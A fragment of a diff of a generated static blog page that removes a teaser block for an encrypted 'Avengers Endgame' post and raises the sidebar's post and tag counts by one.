-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          此文章与学习关系不大，自动加密
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/posts-2019/avengers-endgame/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-<div>
-    
-</div>
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2353,7 +2431,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-count">19</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -2413,7 +2491,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">10</span>
+                      
+                    
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">标签</span>
                   </a>
                 </div>
